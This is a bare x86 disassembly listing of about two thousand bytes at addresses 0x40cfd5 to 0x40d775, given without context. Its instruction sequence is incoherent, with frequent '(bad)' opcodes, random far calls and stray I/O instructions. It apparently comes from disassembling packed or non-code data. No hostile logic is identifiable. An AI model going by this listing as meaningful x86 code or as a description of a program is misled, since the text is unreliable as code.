  40cfd5:	mov    ds:0x62d027b9,al
  40cfda:	or     al,0x31
  40cfdc:	adc    BYTE PTR [edx+eax*4+0x5000aa86],dl
  40cfe3:	enter  0x1a5,0x9c
  40cfe7:	ds (bad) 
  40cfe9:	jo     0x40d068
  40cfeb:	jo     0x40cfba
  40cfed:	sti    
  40cfee:	mov    eax,ds:0xa60e568
  40cff3:	fadd   QWORD PTR [ecx-0xc]
  40cff6:	pushf  
  40cff7:	enter  0x4623,0xd1
  40cffb:	push   esi
  40cffc:	jo     0x40d07b
  40cffe:	fcom   QWORD PTR [ecx+0xd]
  40d001:	mov    esi,0x88757793
  40d006:	mov    esp,DWORD PTR [ebp-0x4]
  40d009:	dec    esi
  40d00a:	call   0xc670:0xbd561ba5
  40d011:	inc    ebp
  40d012:	xchg   edi,eax
  40d013:	xchg   esi,eax
  40d014:	sti    
  40d015:	pop    ds
  40d016:	and    DWORD PTR ds:0x54952ab9,eax
  40d01c:	xchg   esi,eax
  40d01d:	stc    
  40d01e:	icebp  
  40d01f:	or     ecx,ebx
  40d021:	mov    edi,0x2708e3b1
  40d026:	cs into 
  40d028:	mov    dh,0xde
  40d02a:	pushf  
  40d02b:	or     DWORD PTR [ebp+0x5e],esp
  40d02e:	sub    al,0xab
  40d030:	mov    al,ds:0xa7d8bdb7
  40d035:	enter  0xd9f9,0x8b
  40d039:	mov    ebp,0x63bab228
  40d03e:	or     edx,DWORD PTR [ecx+0x7488976a]
  40d044:	mov    ebx,DWORD PTR [edx+0x17f0cdca]
  40d04a:	stos   DWORD PTR es:[edi],eax
  40d04b:	rcr    DWORD PTR ds:0x5efd955a,1
  40d051:	mov    ds:0xdfd17838,eax
  40d056:	adc    al,ch
  40d058:	fwait
  40d059:	xchg   ebp,eax
  40d05a:	outs   dx,BYTE PTR ds:[esi]
  40d05b:	sbb    ecx,DWORD PTR [eax]
  40d05d:	cld    
  40d05e:	sahf   
  40d05f:	fcom   QWORD PTR [edx]
  40d061:	or     bh,BYTE PTR ds:0xd6dec64
  40d067:	enter  0x266e,0xc1
  40d06b:	out    0xba,eax
  40d06d:	and    BYTE PTR [ecx+0x51c26fae],dl
  40d073:	inc    edi
  40d074:	cwde   
  40d075:	fsubrp st(0),st
  40d077:	nop
  40d078:	nop
  40d079:	lods   eax,DWORD PTR ds:[esi]
  40d07a:	cdq    
  40d07b:	sahf   
  40d07c:	mov    edi,0x495371f3
  40d081:	lea    edx,[ecx+eax*1-0x552b0960]
  40d088:	jbe    0x40d07d
  40d08a:	sar    BYTE PTR [eax],1
  40d08c:	fdivr  DWORD PTR [ecx+0x26fc4672]
  40d092:	int3   
  40d093:	outs   dx,DWORD PTR ds:[esi]
  40d094:	jle    0x40d04b
  40d096:	pop    ebp
  40d097:	ficomp WORD PTR [ecx+0x7d]
  40d09a:	shl    DWORD PTR [eax],cl
  40d09c:	inc    edx
  40d09d:	jl     0x40d0cc
  40d09f:	sub    dl,BYTE PTR [ebp+edi*1-0x4df5006e]
  40d0a6:	pop    eax
  40d0a7:	inc    ebx
  40d0a8:	dec    ecx
  40d0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0aa:	fdiv   DWORD PTR [ebx-0x10851e41]
  40d0b0:	arpl   WORD PTR [eax],bx
  40d0b2:	adc    al,0xda
  40d0b4:	or     ch,BYTE PTR [edi-0x55853ef7]
  40d0ba:	popf   
  40d0bb:	mov    edi,0xfd2f0cea
  40d0c0:	sbb    esp,ebp
  40d0c2:	push   ebx
  40d0c3:	jg     0x40d10e
  40d0c5:	repnz pop eax
  40d0c7:	xchg   edx,eax
  40d0c8:	pop    esp
  40d0c9:	cs cli 
  40d0cb:	add    eax,0xc988c033
  40d0d0:	adc    al,0x9d
  40d0d2:	shl    BYTE PTR [edx+edi*2],0xa5
  40d0d6:	push   ecx
  40d0d7:	sbb    ah,BYTE PTR [ecx-0xbcc20d3]
  40d0dd:	cwde   
  40d0de:	std    
  40d0df:	ins    DWORD PTR es:[edi],dx
  40d0e0:	pop    esi
  40d0e1:	cld    
  40d0e2:	stos   BYTE PTR es:[edi],al
  40d0e3:	sub    ecx,DWORD PTR [edi]
  40d0e5:	into   
  40d0e6:	stos   DWORD PTR es:[edi],eax
  40d0e7:	aas    
  40d0e8:	mov    WORD PTR ss:[edi],cs
  40d0eb:	or     BYTE PTR [ecx-0x6520ac86],al
  40d0f1:	push   0xffffffc0
  40d0f3:	stc    
  40d0f4:	mov    ah,0xdd
  40d0f6:	inc    ebx
  40d0f7:	xchg   ebx,eax
  40d0f8:	imul   eax,DWORD PTR [ecx],0x35c96fcb
  40d0fe:	arpl   WORD PTR [ebp+0x5fa47316],bp
  40d104:	dec    ebx
  40d105:	ins    BYTE PTR es:[edi],dx
  40d106:	and    ecx,DWORD PTR [ecx]
  40d108:	je     0x40d09e
  40d10a:	retf   0x9270
  40d10d:	sbb    ch,BYTE PTR [ebx-0x2f]
  40d110:	lahf   
  40d111:	hlt    
  40d112:	call   0x54f2:0x188b4007
  40d119:	test   DWORD PTR [ecx+0x2db1d97b],0x885f70a4
  40d123:	xor    ebx,DWORD PTR [esi+0x213b7d93]
  40d129:	bound  edi,QWORD PTR [esi]
  40d12b:	jnp    0x40d117
  40d12d:	sbb    BYTE PTR [edx+0x72a0af23],al
  40d133:	popf   
  40d134:	dec    esp
  40d135:	pop    ebp
  40d136:	xchg   ebp,eax
  40d137:	sar    DWORD PTR [esi-0x7a95034c],1
  40d13d:	(bad)
  40d141:	stc    
  40d142:	push   es
  40d143:	leave  
  40d144:	sub    edx,DWORD PTR [edx+0x79]
  40d147:	mov    DWORD PTR [ebx],ebp
  40d149:	test   al,0x21
  40d14b:	jmp    0x209b:0x1c3ba3a8
  40d152:	pusha  
  40d153:	loopne 0x40d1b3
  40d155:	xchg   BYTE PTR [eax-0x73246bf2],dl
  40d15b:	ss stc 
  40d15d:	lods   eax,DWORD PTR ds:[esi]
  40d15e:	aam    0xd2
  40d160:	dec    edi
  40d161:	call   0xc168363a
  40d166:	dec    esp
  40d167:	fimul  DWORD PTR [edx+esi*2]
  40d16a:	mov    eax,0xff1ae9ae
  40d16f:	data16 sahf 
  40d171:	xor    edi,DWORD PTR [edi-0x18]
  40d174:	push   ebp
  40d175:	cs sbb al,0x18
  40d178:	js     0x40d135
  40d17a:	mov    esi,0xc369bede
  40d17f:	fdivr  st(0),st
  40d181:	cdq    
  40d182:	mov    ecx,0x27aa37e3
  40d187:	fsubr  QWORD PTR [edi]
  40d189:	and    BYTE PTR [ebx-0x312cb3da],dl
  40d18f:	aad    0xab
  40d191:	xchg   edi,eax
  40d192:	fs pop ss
  40d194:	das    
  40d195:	js     0x40d163
  40d197:	sbb    DWORD PTR [ebp+0x585cb1a0],0xffffffcd
  40d19e:	jno    0x40d16f
  40d1a0:	call   0x65d5:0xf996e612
  40d1a7:	(bad)  
  40d1a8:	mov    eax,ds:0x76720d2
  40d1ad:	inc    edi
  40d1ae:	out    0x6,al
  40d1b0:	lahf   
  40d1b1:	iret   
  40d1b2:	xor    eax,0x1ae1f5e8
  40d1b7:	mov    ebx,0xac30edb9
  40d1bc:	rol    BYTE PTR [ebp-0x48d14c9d],1
  40d1c2:	adc    eax,0xddc8c6c8
  40d1c7:	rcr    DWORD PTR [ebx+0x5d968c4c],0xed
  40d1ce:	call   0x8c79:0x38eda489
  40d1d5:	nop
  40d1d6:	es push ds
  40d1d8:	add    BYTE PTR [esi],0x91
  40d1db:	jg     0x40d225
  40d1dd:	loopne 0x40d192
  40d1df:	xchg   esi,eax
  40d1e0:	cmp    eax,0x84091af0
  40d1e5:	fwait
  40d1e6:	sbb    al,0x95
  40d1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e9:	(bad)  
  40d1ea:	(bad)  
  40d1eb:	cld    
  40d1ec:	pop    ss
  40d1ed:	arpl   dx,cx
  40d1ef:	cli    
  40d1f0:	cdq    
  40d1f1:	or     eax,0x2b6d3fca
  40d1f6:	fldcw  WORD PTR [esi-0x409d35dc]
  40d1fc:	mov    dl,0xdd
  40d1fe:	push   eax
  40d1ff:	cmp    al,ah
  40d201:	out    dx,eax
  40d202:	sub    ch,ah
  40d204:	xor    eax,0x16052a5d
  40d209:	daa    
  40d20a:	cmp    edx,0x88dc93c7
  40d210:	(bad)  
  40d211:	hlt    
  40d212:	scas   eax,DWORD PTR es:[edi]
  40d213:	cmc    
  40d214:	cdq    
  40d215:	daa    
  40d216:	int    0x6e
  40d218:	sbb    BYTE PTR [ecx-0x36ad9b2e],bh
  40d21e:	or     eax,0x9f368a99
  40d223:	test   eax,0xdaa98164
  40d228:	cwde   
  40d229:	sub    DWORD PTR es:[ebx+esi*1+0x67acab],esp
  40d231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d232:	jne    0x40d227
  40d234:	aam    0x73
  40d236:	jns    0x40d1db
  40d238:	iret   
  40d239:	and    eax,0xf5b37d59
  40d23e:	add    ebx,DWORD PTR [esi]
  40d240:	pop    edi
  40d241:	or     eax,0x2d04154c
  40d246:	mov    WORD PTR [edx],fs
  40d248:	sar    DWORD PTR [eax-0x68],cl
  40d24b:	das    
  40d24c:	xor    esp,edi
  40d24e:	xchg   DWORD PTR [eax-0x24361aa9],ebx
  40d254:	nop
  40d255:	jnp    0x40d1ee
  40d257:	and    al,dh
  40d259:	push   0x1f
  40d25b:	inc    ebx
  40d25c:	jle    0x40d1f8
  40d25e:	dec    esp
  40d25f:	add    ch,dh
  40d261:	sbb    al,0xbb
  40d263:	and    bh,ah
  40d265:	mov    eax,ds:0xd5d4126e
  40d26a:	push   edi
  40d26b:	push   cs
  40d26c:	xor    ah,BYTE PTR [esi]
  40d26e:	fisttp DWORD PTR [ebp-0x36]
  40d271:	mov    eax,0x221dd3b5
  40d276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d277:	xchg   BYTE PTR [ebx+esi*1+0x68b90e66],dh
  40d27e:	mov    ebx,0x26a48320
  40d283:	call   DWORD PTR [ebx]
  40d285:	mov    dh,0x37
  40d287:	fcomp  QWORD PTR [edx]
  40d289:	jp     0x40d27b
  40d28b:	lea    ebp,[edi+0x246d8732]
  40d291:	push   0x4b
  40d293:	daa    
  40d294:	add    al,0x55
  40d296:	cmp    ch,BYTE PTR [ecx+ebp*2-0x34]
  40d29a:	mov    sp,0xe821
  40d29e:	ret    
  40d29f:	push   ss
  40d2a0:	imul   esi,DWORD PTR [edi],0x67
  40d2a3:	push   0xc24af9f3
  40d2a8:	add    dl,BYTE PTR [ecx]
  40d2aa:	lods   al,BYTE PTR ds:[esi]
  40d2ab:	fisub  WORD PTR [edx+0x6c09ea2a]
  40d2b1:	clc    
  40d2b2:	mov    bh,0x16
  40d2b4:	mov    cl,cl
  40d2b6:	inc    ebp
  40d2b7:	mov    edi,0x86bc029a
  40d2bc:	dec    ecx
  40d2bd:	jno    0x40d246
  40d2bf:	add    edx,DWORD PTR [ebx-0x25ede28d]
  40d2c5:	push   es
  40d2c6:	inc    edx
  40d2c7:	pop    esi
  40d2c8:	add    ebx,ecx
  40d2ca:	out    dx,eax
  40d2cb:	cmp    DWORD PTR [esi+0x78086b2c],ebp
  40d2d1:	sbb    BYTE PTR [ebp-0x3b77913e],0x5b
  40d2d8:	or     eax,0x279be8b1
  40d2dd:	xchg   edx,eax
  40d2de:	xchg   ecx,eax
  40d2df:	adc    ebx,DWORD PTR [ebx+0x2c]
  40d2e2:	fldenv [esi]
  40d2e4:	mov    BYTE PTR [edi],bl
  40d2e6:	jno    0x40d26e
  40d2e8:	nop
  40d2e9:	outs   dx,DWORD PTR ds:[esi]
  40d2ea:	mov    al,0x9d
  40d2ec:	mov    ds:0x59f92e36,eax
  40d2f1:	stos   BYTE PTR es:[edi],al
  40d2f2:	int3   
  40d2f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f4:	lods   eax,DWORD PTR ds:[esi]
  40d2f5:	xor    eax,0x54274754
  40d2fa:	pop    esi
  40d2fb:	(bad)  
  40d2fc:	aas    
  40d2fd:	(bad)  
  40d2fe:	adc    al,0xa7
  40d300:	lock mov edx,0xc1fbbcdf
  40d306:	inc    ecx
  40d307:	mov    es,WORD PTR [ebp+ebp*8-0x63601adf]
  40d30e:	lea    ebp,[esi+edx*4+0x138821c2]
  40d315:	nop
  40d316:	sub    DWORD PTR [eax+0x2],ebp
  40d319:	mov    ds:0x93d69c44,al
  40d31e:	mov    ebp,ebx
  40d320:	xor    DWORD PTR [ebp-0x686d07e9],edi
  40d326:	push   0xdc6c96e6
  40d32b:	js     0x40d2ff
  40d32d:	ins    BYTE PTR es:[edi],dx
  40d32e:	ret    0x475d
  40d331:	aaa    
  40d332:	mov    cl,0x89
  40d334:	add    ebp,esi
  40d336:	mov    ds,ebx
  40d338:	fcomp  st(3)
  40d33a:	ror    DWORD PTR [ecx+edx*1-0x66],cl
  40d33e:	int3   
  40d33f:	outs   dx,DWORD PTR ds:[esi]
  40d340:	mov    dl,0x6b
  40d342:	leave  
  40d343:	in     eax,0x6e
  40d345:	adc    BYTE PTR [eax],0x45
  40d348:	xor    al,0x85
  40d34a:	adc    ebx,DWORD PTR [edx-0x6ccf13cd]
  40d350:	xchg   edi,eax
  40d351:	push   ebx
  40d352:	cs add eax,0x51fc7da5
  40d358:	mov    edi,0x1ee4b229
  40d35d:	gs xchg edx,eax
  40d35f:	and    al,0x78
  40d361:	or     al,0x2c
  40d363:	popf   
  40d364:	xor    ah,dh
  40d366:	cwde   
  40d367:	sbb    bh,cl
  40d369:	add    cl,BYTE PTR [ecx-0x5c]
  40d36c:	cmp    eax,DWORD PTR [edx]
  40d36e:	jmp    0x76fee637
  40d373:	xchg   ebp,eax
  40d374:	clc    
  40d375:	inc    ebx
  40d376:	in     eax,dx
  40d377:	fmul   DWORD PTR ds:0x212a6185
  40d37d:	(bad)  
  40d37e:	jmp    0x1e5:0xe0f9cbce
  40d385:	inc    edx
  40d386:	fs jnp 0x40d34c
  40d389:	leave  
  40d38a:	and    eax,DWORD PTR [edx-0x68c8418e]
  40d390:	pop    ss
  40d391:	cwde   
  40d392:	and    al,0xc9
  40d394:	int3   
  40d395:	and    dh,BYTE PTR [edx-0xa]
  40d398:	pop    es
  40d399:	into   
  40d39a:	sub    al,0x65
  40d39c:	arpl   di,si
  40d39e:	iret   
  40d39f:	stos   DWORD PTR es:[edi],eax
  40d3a0:	popa   
  40d3a1:	ss adc al,0x1d
  40d3a4:	hlt    
  40d3a5:	push   ds
  40d3a6:	loopne 0x40d3ed
  40d3a8:	inc    ecx
  40d3a9:	jmp    0x5ea5cb89
  40d3ae:	adc    DWORD PTR [eax+0x10577b20],esp
  40d3b4:	int    0x73
  40d3b6:	scas   ax,WORD PTR es:[edi]
  40d3b8:	aam    0xb3
  40d3ba:	add    DWORD PTR [edx],edx
  40d3bc:	mov    esp,0x3e607885
  40d3c1:	shl    BYTE PTR [edi-0x2b956777],0xec
  40d3c8:	fstp   st(6)
  40d3ca:	and    ah,ah
  40d3cc:	push   ebp
  40d3cd:	push   0x3a8f7af8
  40d3d2:	or     BYTE PTR [ebx+esi*2+0xd],dl
  40d3d6:	mov    al,0xf7
  40d3d8:	xor    al,0x6e
  40d3da:	inc    esi
  40d3db:	rol    DWORD PTR [ebp-0x29],cl
  40d3de:	test   al,0xa3
  40d3e0:	cmp    eax,0xd1948832
  40d3e5:	imul   ebx,DWORD PTR [ebx+edx*4-0x70b0da7e],0x6414a06c
  40d3f0:	mov    ds:0xb1a85fb0,al
  40d3f5:	dec    esp
  40d3f6:	sbb    BYTE PTR [ebp-0x40],bl
  40d3f9:	and    dh,bl
  40d3fb:	lods   eax,DWORD PTR ds:[esi]
  40d3fc:	aam    0x13
  40d3fe:	adc    BYTE PTR [ecx-0x4c],cl
  40d401:	dec    esi
  40d402:	add    ebp,edi
  40d404:	xchg   esp,eax
  40d405:	pop    ecx
  40d406:	scas   eax,DWORD PTR es:[edi]
  40d407:	pop    esp
  40d408:	and    BYTE PTR [ebp-0x61],ah
  40d40b:	stos   DWORD PTR es:[edi],eax
  40d40c:	xchg   edi,eax
  40d40d:	js     0x40d3fe
  40d40f:	aas    
  40d410:	xchg   dh,ah
  40d412:	outs   dx,BYTE PTR ds:[esi]
  40d413:	into   
  40d414:	aam    0x14
  40d416:	push   esi
  40d417:	sets   BYTE PTR [esi+0x7cc3e54f]
  40d41e:	push   ecx
  40d41f:	xchg   ebp,eax
  40d420:	jl     0x40d453
  40d422:	pop    ds
  40d423:	cs adc al,0x4
  40d426:	cwde   
  40d427:	inc    eax
  40d428:	add    edi,ecx
  40d42a:	imul   ebx,DWORD PTR [ebp-0xc],0xe2cc9e7
  40d431:	sbb    bh,BYTE PTR [ebp+ebp*1+0x43]
  40d435:	in     al,dx
  40d436:	(bad)  
  40d437:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d439:	dec    edx
  40d43a:	mov    dh,0x2e
  40d43c:	fs or  ch,dh
  40d43f:	out    0x7e,eax
  40d441:	mov    ch,al
  40d443:	shl    DWORD PTR [ebx],cl
  40d445:	jl     0x40d441
  40d447:	stc    
  40d448:	scas   eax,DWORD PTR es:[edi]
  40d449:	fadd   DWORD PTR cs:[ebx+0x3f6d0125]
  40d450:	mov    ah,0x1f
  40d452:	push   ss
  40d453:	cli    
  40d454:	jae    0x40d3e2
  40d456:	xchg   ecx,eax
  40d457:	daa    
  40d458:	push   eax
  40d459:	mov    BYTE PTR [eax+0x7c],bl
  40d45c:	mov    ch,0x7b
  40d45e:	dec    ecx
  40d45f:	adc    bl,BYTE PTR [ebp-0x4]
  40d462:	pop    ss
  40d463:	test   al,0x11
  40d465:	xchg   BYTE PTR [eax-0x9],cl
  40d468:	shl    BYTE PTR [ebx],1
  40d46a:	ret    0xcf33
  40d46d:	mov    DWORD PTR [ebp-0x4],eax
  40d470:	jmp    0x40d9fa
  40d475:	mov    ds:0x60bf5ac5,eax
  40d47a:	sbb    BYTE PTR [edx],ah
  40d47c:	cdq    
  40d47d:	cmovbe edx,DWORD PTR [edx+esi*4-0x11]
  40d482:	sbb    BYTE PTR [edx-0x52],ch
  40d485:	xlat   BYTE PTR ds:[ebx]
  40d486:	mov    ah,0x16
  40d488:	push   ss
  40d489:	cmp    eax,0x78161604
  40d48e:	push   edi
  40d48f:	mov    ah,0x37
  40d491:	and    BYTE PTR [eax+eax*1-0x7d],cl
  40d495:	fadd   QWORD PTR [ecx]
  40d497:	cmp    eax,0x18ee1fe5
  40d49c:	ror    dh,0xab
  40d49f:	das    
  40d4a0:	repz fimul WORD PTR [edi+0x78]
  40d4a4:	or     eax,DWORD PTR [ecx-0x32]
  40d4a7:	mov    eax,cs:0x639ddec7
  40d4ad:	adc    DWORD PTR [edx-0xe],esi
  40d4b0:	mov    fs:0xdcbd56c2,al
  40d4b6:	lahf   
  40d4b7:	push   esp
  40d4b8:	fild   DWORD PTR [ecx]
  40d4ba:	mov    dh,0x74
  40d4bc:	mov    bl,0x27
  40d4be:	push   es
  40d4bf:	(bad)  
  40d4c0:	cdq    
  40d4c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c2:	sbb    edx,DWORD PTR [esi]
  40d4c4:	loope  0x40d4f3
  40d4c6:	pop    esi
  40d4c7:	out    0x97,al
  40d4c9:	xor    DWORD PTR [ebp-0x3eb0eea8],ebx
  40d4cf:	adc    ecx,esp
  40d4d1:	pop    ecx
  40d4d2:	sbb    eax,0xdeb8b9f8
  40d4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d8:	imul   bh
  40d4da:	mov    esi,edi
  40d4dc:	mov    ds:0x104448de,eax
  40d4e1:	sbb    ebx,DWORD PTR [esi-0x45a4c50c]
  40d4e7:	cmp    al,0xe5
  40d4e9:	std    
  40d4ea:	stc    
  40d4eb:	adc    bh,ah
  40d4ed:	mov    dh,0x1f
  40d4ef:	fcmovb st,st(7)
  40d4f1:	pop    edx
  40d4f2:	sbb    DWORD PTR [edi+0x4c],ebp
  40d4f5:	mov    esp,DWORD PTR [ebp-0x519ba7c0]
  40d4fb:	sahf   
  40d4fc:	int    0x24
  40d4fe:	jg     0x40d52c
  40d500:	push   es
  40d501:	mov    bh,0x6b
  40d503:	cmp    ch,BYTE PTR [ebx+0x59]
  40d506:	pusha  
  40d507:	inc    edi
  40d508:	and    ebp,ebp
  40d50a:	repnz sti 
  40d50c:	sub    eax,0x11acae07
  40d511:	jo     0x40d57e
  40d513:	mov    eax,ds:0x61f20a6f
  40d518:	jo     0x40d4d4
  40d51a:	mov    dl,0x2e
  40d51c:	xor    BYTE PTR [ebx],ah
  40d51e:	pushf  
  40d51f:	adc    al,0xdb
  40d521:	mov    ch,0x9a
  40d523:	jg     0x40d50e
  40d525:	mov    esp,0x92953aaa
  40d52a:	sub    DWORD PTR [edi],edi
  40d52c:	sar    BYTE PTR [ecx],1
  40d52e:	fs fwait
  40d530:	pop    esi
  40d531:	add    BYTE PTR [ebx+0x5d6ce38],cl
  40d537:	call   0xaa0:0xb63de071
  40d53e:	sbb    BYTE PTR [edx+0x4d74f46f],0x87
  40d545:	jae    0x40d526
  40d547:	dec    eax
  40d548:	xchg   edi,eax
  40d549:	and    BYTE PTR [edi],ah
  40d54b:	cmp    BYTE PTR [ebx-0x4435bd00],ah
  40d551:	cwde   
  40d552:	mov    eax,cs
  40d554:	inc    eax
  40d555:	and    DWORD PTR [esi-0x31],esi
  40d558:	ins    BYTE PTR es:[edi],dx
  40d559:	retf   0xb310
  40d55c:	cmp    BYTE PTR [edi+0x48],ah
  40d55f:	inc    ebx
  40d560:	fcmove st,st(2)
  40d562:	mov    bh,0xc4
  40d564:	das    
  40d565:	lods   eax,DWORD PTR ds:[esi]
  40d566:	(bad)  
  40d567:	mov    edi,0xf8718eef
  40d56c:	and    dl,BYTE PTR [ecx]
  40d56e:	fsub   QWORD PTR [edx+0x71a0a201]
  40d574:	sub    BYTE PTR [ecx+0x4adcc8c7],0x7a
  40d57b:	sti    
  40d57c:	mov    ds:0xafaa9ca5,al
  40d581:	mov    al,ds:0x8c09cc03
  40d586:	sbb    eax,0xb0a23d38
  40d58b:	stos   DWORD PTR es:[edi],eax
  40d58c:	lock out 0xd6,al
  40d58f:	or     dh,ah
  40d591:	(bad)
  40d595:	add    edi,eax
  40d597:	shl    DWORD PTR [eax],cl
  40d599:	mov    ebx,0xebe2e47b
  40d59e:	iret   
  40d59f:	mov    eax,0xc54c9a53
  40d5a4:	add    eax,edx
  40d5a6:	ret    
  40d5a7:	sub    ebp,eax
  40d5a9:	adc    cl,bh
  40d5ab:	retf   0x86b6
  40d5ae:	add    bh,ch
  40d5b0:	push   ecx
  40d5b1:	or     esi,ebx
  40d5b3:	shl    BYTE PTR [edi-0x48043c95],1
  40d5b9:	inc    ecx
  40d5ba:	pop    edx
  40d5bb:	and    BYTE PTR [eax+0x6d],bh
  40d5be:	or     ebx,DWORD PTR [ebx+0x4cd89ab3]
  40d5c4:	xchg   edx,eax
  40d5c5:	and    eax,0x975f639d
  40d5ca:	push   0xbe4b9f0a
  40d5cf:	hlt    
  40d5d0:	pop    esp
  40d5d1:	or     dl,al
  40d5d3:	jne    0x40d612
  40d5d5:	xbegin 0x9137d2b1
  40d5db:	cmp    al,0xa4
  40d5dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5de:	fs mov ebp,0x7953c515
  40d5e4:	lea    esi,[ebp+0x77230310]
  40d5ea:	or     DWORD PTR [edi],0x67
  40d5ed:	mov    bl,0x65
  40d5ef:	mov    ebx,0x9daeae73
  40d5f4:	add    eax,0x90478a39
  40d5f9:	repnz pusha 
  40d5fb:	pop    es
  40d5fc:	push   ecx
  40d5fd:	mov    ebp,0x942c45ab
  40d602:	pop    ds
  40d603:	xchg   esp,eax
  40d604:	and    DWORD PTR [edx+esi*1],esp
  40d607:	call   DWORD PTR [edx-0x1d816d9d]
  40d60d:	std    
  40d60e:	jmp    0xe3ac:0x7cbfb904
  40d615:	jno    0x40d657
  40d617:	push   ebx
  40d618:	and    DWORD PTR [ebx],0x3
  40d61b:	fisubr WORD PTR [ebp+0x5fdc611b]
  40d621:	push   edi
  40d622:	push   es
  40d623:	out    dx,al
  40d624:	mov    dl,0xdf
  40d626:	add    eax,0x37d58246
  40d62b:	neg    edi
  40d62d:	sub    ebx,eax
  40d62f:	popf   
  40d630:	sbb    ch,dh
  40d632:	(bad)  
  40d633:	stc    
  40d634:	mov    ch,0xcd
  40d636:	retf   
  40d637:	in     eax,0xce
  40d639:	xor    BYTE PTR [edx+0xaf4aab5],cl
  40d63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d640:	ds int3 
  40d642:	arpl   WORD PTR [esi],ax
  40d644:	imul   edx,DWORD PTR [eax+0x144d3256],0x50fdc3db
  40d64e:	xor    cl,BYTE PTR [esi]
  40d650:	(bad)  
  40d651:	mov    ebx,0xb009da76
  40d656:	test   DWORD PTR [eax],0xb8e8aa33
  40d65c:	and    eax,0x58760d96
  40d661:	test   al,0x81
  40d663:	sub    al,0xb5
  40d665:	xchg   esi,eax
  40d666:	imul   edx,ebp,0x4e
  40d669:	add    al,0x1d
  40d66b:	ret    0x1758
  40d66e:	or     DWORD PTR [edi+eax*1-0x2d],0x27858e4e
  40d676:	xchg   edi,eax
  40d677:	adc    dl,BYTE PTR [ebp-0x1e]
  40d67a:	xor    DWORD PTR [ebx+0x48266677],edi
  40d680:	cmp    BYTE PTR [ecx],bl
  40d682:	mov    eax,ds:0xc8f6c6d7
  40d687:	repnz (bad) 
  40d689:	cld    
  40d68a:	xchg   ebp,eax
  40d68b:	xchg   edi,eax
  40d68c:	pop    ss
  40d68d:	sbb    al,0x13
  40d68f:	mov    dh,0x40
  40d691:	or     al,0xaa
  40d693:	dec    ebx
  40d694:	lods   eax,DWORD PTR ds:[esi]
  40d695:	cmp    DWORD PTR [eax+eiz*1-0x6f],0x148e29e1
  40d69d:	sub    DWORD PTR [esi+0x3d],edi
  40d6a0:	(bad)  
  40d6a1:	jmp    0x40d70c
  40d6a3:	sbb    DWORD PTR [ecx-0x4f10a0d1],esi
  40d6a9:	int    0xb2
  40d6ab:	push   0x5d
  40d6ad:	sbb    eax,0xb36cf73a
  40d6b2:	xchg   BYTE PTR [ebx],dl
  40d6b4:	jbe    0x40d672
  40d6b6:	dec    edx
  40d6b7:	js     0x40d67f
  40d6b9:	int3   
  40d6ba:	clc    
  40d6bb:	inc    edi
  40d6bc:	loop   0x40d6ef
  40d6be:	adc    edi,DWORD PTR [ebx-0x3c]
  40d6c1:	(bad)  
  40d6c2:	in     eax,dx
  40d6c3:	jae    0x40d665
  40d6c5:	xchg   BYTE PTR [ecx],cl
  40d6c7:	and    ecx,DWORD PTR [ecx+0x7f4adcc5]
  40d6cd:	repz aaa 
  40d6cf:	mov    dl,bh
  40d6d1:	push   esi
  40d6d2:	rol    BYTE PTR [esi],cl
  40d6d4:	push   0x4
  40d6d6:	cmp    DWORD PTR [ecx-0x8],0xa0eaaedd
  40d6dd:	push   ecx
  40d6de:	test   BYTE PTR [ecx+0x13d4b89b],cl
  40d6e4:	(bad)  
  40d6e5:	push   ebx
  40d6e6:	(bad)  [eax-0x29]
  40d6e9:	xchg   esp,eax
  40d6ea:	xor    ah,BYTE PTR [edx]
  40d6ec:	pop    es
  40d6ed:	inc    esi
  40d6ee:	bnd lock jno 0x40d6b9
  40d6f2:	inc    esp
  40d6f3:	add    al,0x1d
  40d6f5:	jmp    0x97d9996c
  40d6fa:	data16 int 0x1c
  40d6fd:	sbb    dl,BYTE PTR [esi+ebx*1]
  40d700:	std    
  40d701:	aad    0xe0
  40d703:	cmc    
  40d704:	cmc    
  40d705:	pop    eax
  40d706:	stc    
  40d707:	popf   
  40d708:	xchg   ebp,eax
  40d709:	js     0x40d6da
  40d70b:	push   0xffffff9a
  40d70d:	imul   edx,esi,0xfcb3a83
  40d713:	in     eax,dx
  40d714:	je     0x40d766
  40d716:	push   esi
  40d717:	pop    esi
  40d718:	mov    dh,0xb5
  40d71a:	lock retf 
  40d71c:	mov    al,ds:0xd5629710
  40d721:	pop    ebx
  40d722:	loop   0x40d783
  40d724:	mov    al,0xd1
  40d726:	scas   eax,DWORD PTR es:[edi]
  40d727:	sar    DWORD PTR [ebx+eiz*8],0x13
  40d72b:	fwait
  40d72c:	mul    dl
  40d72e:	xchg   ecx,eax
  40d72f:	inc    eax
  40d730:	fidivr WORD PTR [ebp-0x69]
  40d733:	ins    DWORD PTR es:[edi],dx
  40d734:	gs sub ebp,0xfffffff5
  40d738:	repnz lods al,BYTE PTR ds:[esi]
  40d73a:	sub    BYTE PTR [ebp-0x71],0x63
  40d73e:	lods   al,BYTE PTR ds:[esi]
  40d73f:	xchg   DWORD PTR [ecx-0xa5b75d9],edx
  40d745:	jecxz  0x40d71b
  40d747:	stc    
  40d748:	fild   DWORD PTR [ecx]
  40d74a:	cdq    
  40d74b:	cmp    DWORD PTR [esi],edi
  40d74d:	or     BYTE PTR [eax+0x22d8d4c8],0xde
  40d754:	mov    ch,0xf9
  40d756:	fmul   QWORD PTR [ebx+ebx*4]
  40d759:	fild   DWORD PTR [ecx-0x4e8da157]
  40d75f:	addr16 (bad) 
  40d761:	leave  
  40d762:	and    dh,BYTE PTR [ebx-0x6025c2d6]
  40d768:	adc    BYTE PTR [esi],al
  40d76a:	dec    ebp
  40d76b:	icebp  
  40d76c:	jns    0x40d723
  40d76e:	push   esi
  40d76f:	xor    ebp,edi
  40d771:	and    ch,BYTE PTR [edi+0x2c]
  40d774:	pushf  
  40d775:	lds    eax,FWORD PTR [edi]
